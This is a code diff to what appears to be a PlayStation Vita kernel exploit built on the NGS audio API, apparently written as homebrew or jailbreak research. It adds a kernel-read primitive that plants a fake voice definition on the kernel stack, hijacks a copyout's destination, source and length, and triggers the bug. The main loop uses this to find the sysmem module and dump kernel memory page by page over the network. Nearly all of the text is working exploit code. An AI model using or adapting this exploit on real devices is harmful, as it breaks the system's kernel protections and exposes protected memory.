@@ -339,7 +339,7 @@ int leak_sysmem_motiondev() {
 	return (info[0] - 0x27000) & 0xFFFF0000; // Sysmem resolving for any FW, method found by CelesteBlue
 }
 
-int kernel_read_word(void *dst, void *src) {
+int kernel_read_ngs_word(void *dst, void *src) {
 	uint32_t kstack_devctl_inbuf_addr = leaked_kstack_addr + 0xAF0 - 0x30;
 
 	// 1) Write data into kernel stack
@@ -352,11 +352,54 @@ int kernel_read_word(void *dst, void *src) {
 	return sceNgsVoiceDefinitionGetPresetInternal((void *)kstack_devctl_inbuf_addr, 0, dst);
 }
 
-void kernel_read(void *dst, void *src, uint32_t size) {
-	uint32_t i;
-	for (i = 0; i < size; i += 4)
-		kernel_read_word(dst + i, src + i);
+void kernel_read_ngs(void *dst, void *src, uint32_t size) {
+	for (uint32_t i = 0; i < size; i += 4)
+		kernel_read_ngs_word(dst + i, src + i);
 }
+
+void kernel_read_ngsuser(void *dst, void *src, uint32_t size) {
+	uint32_t ret = 0;
+	
+	// Write voiceDef to kstack
+	sceIoDevctl("", 0, voiceDef, 0x3FF, NULL, 0);
+	// for recent FWs for exemple 3.60
+	for (uint32_t addr = leaked_kstack_addr; addr < 0x03000000; addr += 2) {
+		rackDesc.pVoiceDefn = (struct SceNgsVoiceDefinition*) (addr ^ SCE_NGS_VOICE_DEFINITION_XOR);
+		ret = sceNgsRackGetRequiredMemorySize(s_sysHandle, &rackDesc, &paramsize);
+		if (ret != SCE_NGS_ERROR_INVALID_PARAM) {
+			printf("found voiceDef in kstack\n");
+			break;
+		}
+	}
+	if (ret == SCE_NGS_ERROR_INVALID_PARAM) { // for old FWs for exemple 1.692
+		for (uint32_t addr = leaked_kstack_addr; addr < 0x03000000; addr += 2) {
+			rackDesc.pVoiceDefn = (struct SceNgsVoiceDefinition*)addr;
+			ret = sceNgsRackGetRequiredMemorySize(s_sysHandle, &rackDesc, &paramsize);
+			if (ret != SCE_NGS_ERROR_INVALID_PARAM) {
+				printf("found voiceDef in kstack\n");
+				break;
+			}
+		}
+	}
+	
+	// Set presets information in voice definition
+	voiceDef[0x30/sizeof(uint32_t)] = PRESET_LIST_OFFSET;
+	voiceDef[0x34/sizeof(uint32_t)] = 2;
+	
+	// Set presets
+	set_preset(0, 0, -(0x148 + 2 * 0x18) + COPYOUT_PARAMS_OFFSET);
+	set_preset(1, FAKE_COPYOUT_OFFSET, FAKE_COPYOUT_SIZE);
+	
+	// Overwrite copyout's dst, src and len
+	memset((void *)&(voiceDef[FAKE_COPYOUT_OFFSET/sizeof(uint32_t)]), 0, FAKE_COPYOUT_SIZE);
+	voiceDef[(FAKE_COPYOUT_OFFSET + 0x04)/sizeof(uint32_t)] = (uint32_t)dst; // dst
+	voiceDef[(FAKE_COPYOUT_OFFSET + 0x08)/sizeof(uint32_t)] = (uint32_t)src; // src
+	voiceDef[(FAKE_COPYOUT_OFFSET + 0x1c)/sizeof(uint32_t)] = size; // len
+	
+	// Trigger exploit
+	trigger_exploit();
+}
+
 
 ////////// NETWORK ////////////////
 
@@ -519,7 +562,7 @@ int main(void) {
 			// Read sysmem
 			void *addr = (void *)(leaked_sysmem_addr - 0x1000);
 			for (uint32_t i = 0; i < (0x10000000/0x1000); i++) {
-				kernel_read(buffer, addr, 0x1000);
+				kernel_read_ngs(buffer, addr, 0x1000);
 				debug("dumpable address: %08X", addr);
 				addr += 0x1000;
 			}
@@ -543,18 +586,18 @@ int main(void) {
 			int exit = 0;
 			while (!exit) {
 				memset(buffer, 0, 0x1000);
-				kernel_read(buffer, (void *)(leaked_sysmem_addr+i*0x1000), 0x1000);
+				kernel_read_ngsuser(&buffer, (void * )(leaked_sysmem_addr+i*0x1000), 0x1000);
 				for (int j=0; j < 0x1000; j++) {
 					if (!memcmp(buffer+j, sysmem_module_entrypoint_magic, sizeof(sysmem_module_entrypoint_magic))) {
-						debug("found magic !!!!!\n\n");
-						printf("found magic !!!!!\n\n");
 						sysmem_seg0_addr = leaked_sysmem_addr+i*0x1000+j;
+						debug("found magic !!!!!\n0x%08X\n", sysmem_seg0_addr);
+						printf("found magic !!!!!\n0x%08X\n", sysmem_seg0_addr);
 						exit = 1;
 						break;
 					}
 				}
 				printf("looping...\n");
-				sceKernelDelayThread(1 * 1000 * 1000);
+				sceKernelDelayThread(500 * 1000);
 				i++;
 			}
 			
@@ -579,7 +622,7 @@ int main(void) {
 			for (uint32_t i = 0; i < (0x65+0xD2+0x100); i++) {
 				memset(buffer, 0, 0x1000);
 				sceKernelDelayThread(50 * 1000);
-				kernel_read(buffer, (void *)(sysmem_seg0_addr+i*0x1000-delta_sub), 0x1000);
+				kernel_read_ngsuser(&buffer, (void*)(sysmem_seg0_addr+i*0x1000-delta_sub), 0x1000);
 				ret = net_send_buffer(buffer, 0x1000);
 				if (ret >= 0)
 					printf("write res: %08X - addr: %08X - delta: %X\n", ret, sysmem_seg0_addr+i*0x1000-delta_sub, sysmem_seg0_addr+i*0x1000-delta_sub-leaked_sysmem_addr);
